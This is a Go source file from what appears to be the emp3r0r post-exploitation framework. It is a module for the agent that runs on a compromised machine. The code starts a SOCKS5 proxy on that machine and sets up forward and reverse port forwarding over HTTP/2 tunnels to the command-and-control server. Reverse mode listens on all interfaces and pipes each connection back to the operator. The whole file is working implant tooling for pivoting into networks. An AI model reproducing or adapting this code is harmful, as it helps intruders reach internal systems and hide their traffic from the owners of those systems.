package modules

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
)

// PortFwdSession manage a port fwd session
type PortFwdSession struct {
	Addr   string // is a listener when `reverse` is set, a dialer when used normally
	Conn   io.ReadWriteCloser
	Ctx    context.Context
	Cancel context.CancelFunc
}

// PortFwds manage port mappings
var PortFwds sync.Map

// Socks5Proxy sock5 proxy server on agent, listening on addr
// op: on/off
func Socks5Proxy(op string, addr string) (err error) {
	// op
	switch op {
	case "on":
		logging.Infof("Starting Socks5Proxy %s", addr)
		def.ProxyDone = make(chan struct{})
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logging.Errorf("Socks5Proxy panic: %v\n%s", r, util.CallStack())
				}
				close(def.ProxyDone)
			}()
			def.ProxyLock.Lock()
			if def.ProxyServer == nil {
				var err error
				def.ProxyServer, err = common.NewSocks5ProxyServer()
				if err != nil {
					logging.Errorf("Socks5Proxy: ProxyServer is nil and failed to re-initialize: %v", err)
					def.ProxyLock.Unlock()
					return
				}
			}
			def.ProxyLock.Unlock()
			err = transport.StartSocks5Proxy(addr, common.RuntimeConfig.DoHServer, def.ProxyServer, func(l net.Listener) {
				def.ProxyLock.Lock()
				def.ProxyListener = l
				def.ProxyLock.Unlock()
			})
			if err != nil {
				logging.Infof("StartSock5Proxy %s: %v", addr, err)
			}
		}()
	case "off":
		logging.Infof("Stopping Socks5Proxy %s", addr)
		if def.ProxyServer == nil {
			return errors.New("proxy server is not running")
		}
		def.ProxyLock.Lock()
		if def.ProxyListener != nil {
			def.ProxyListener.Close()
		}
		def.ProxyLock.Unlock()
		if def.ProxyDone != nil {
			<-def.ProxyDone
		}
		if err != nil {
			logging.Print(err)
		}

	default:
		return errors.New("operation not supported")
	}

	return err
}

// BuildPortFwdURL returns the single C2 endpoint URL for port forwarding.
// Routing is determined by the CBOR MsgAuth "proxy" capability, not the URL path.
func BuildPortFwdURL(sessionID string) (string, error) {
	if def.CCAddress == "" {
		return "", errors.New("missing CCAddress")
	}
	// sessionID is included so the server can correlate the stream to a session.
	// It is NOT used for routing (that's done by CBOR MsgAuth capability).
	return fmt.Sprintf("%s/?session=%s", def.CCAddress, sessionID), nil
}

func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err error) {
	var (
		session PortFwdSession

		// connection
		conn   io.ReadWriteCloser
		ctx    context.Context
		cancel context.CancelFunc
	)

	if !netutil.ValidateIPPort(addr) && !reverse {
		return fmt.Errorf("invalid address: %s", addr)
	}

	// connect via h2 to CC, or not
	ctx, cancel = context.WithCancel(context.Background())
	if reverse {
		logging.Infof("PortFwd (reversed) started: %s (%s)", addr, sessionID)
		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
	} else {
		conn, ctx, cancel, err = c2transport.EstablishC2Connection(def.CCAddress, sessionID, common.RuntimeConfig.C2Routes.Proxy)
		if err != nil {
			return fmt.Errorf("failed to connect to CC: %v", err)
		}
		logging.Infof("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)

		secureConn := transport.NewSecureConn(conn)
		go transport.FwdToDport(ctx, cancel, addr, sessionID, protocol, secureConn, timeout)
	}

	// remember to cleanup
	defer func() {
		cancel()
		if conn != nil {
			conn.Close() // Underlying net.Conn handles the close
		}

		PortFwds.Delete(sessionID)
		logging.Infof("PortFwd stopped: %s (%s)", addr, sessionID)
	}()

	// save this session
	session.Addr = addr
	session.Conn = conn
	session.Ctx = ctx
	session.Cancel = cancel
	PortFwds.Store(sessionID, &session)

	// check if h2conn is disconnected,
	// if yes, kill all goroutines and cleanup
	for ctx.Err() == nil {
		time.Sleep(100 * time.Millisecond)
	}
	return
}

// start a local listener on agent, forward connections to CC
func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
	port, sessionID string,
) {
	var err error

	// serve a TCP connection received on agent side
	serveConn := func(conn net.Conn) {
		defer func() {
			if r := recover(); r != nil {
				logging.Errorf("serveConn panic: %v", r)
			}
		}()
		// tell CC this is a reversed port mapping
		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
		url, urlErr := BuildPortFwdURL(shID)
		if urlErr != nil {
			logging.Infof("BuildPortFwdURL (%s) failed: %v", shID, urlErr)
			return
		}

		// start a h2 connection per incoming TCP connection
		h2, _, h2cancel, err := c2transport.EstablishC2Connection(url, shID, common.RuntimeConfig.C2Routes.Proxy)
		if err != nil {
			logging.Infof("h2conn (%s) failed: %v", url, err)
			return
		}
		defer func() {
			if h2 != nil {
				_, _ = h2.Write([]byte("exit\n"))
				h2cancel()
			}
			conn.Close()
		}()

		// iocopy
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logging.Errorf("h2 -> conn pipe panic: %v", r)
				}
			}()
			_, err = io.Copy(conn, h2)
			if err != nil {
				logging.Infof("h2 -> conn: %v", err)
			}
		}()
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logging.Errorf("conn -> h2 pipe panic: %v", r)
				}
			}()
			_, err = io.Copy(h2, conn)
			if err != nil {
				logging.Infof("conn -> h2: %v", err)
			}
		}()

		for ctx.Err() == nil {
			time.Sleep(100 * time.Millisecond)
		}
	}

	// listen
	addr := "0.0.0.0:" + port
	l, err := net.Listen("tcp", addr)
	if err != nil {
		logging.Infof("listen on %s failed: %s", addr, err)
		cancel()
	}
	defer func() {
		if l != nil {
			l.Close()
		}
		cancel()
	}()

	// serve
	for ctx.Err() == nil {
		conn, err := l.Accept()
		if err != nil {
			logging.Infof("Listening on 0.0.0.0:%s: %v", port, err)
			continue
		}
		go serveConn(conn)
	}
}
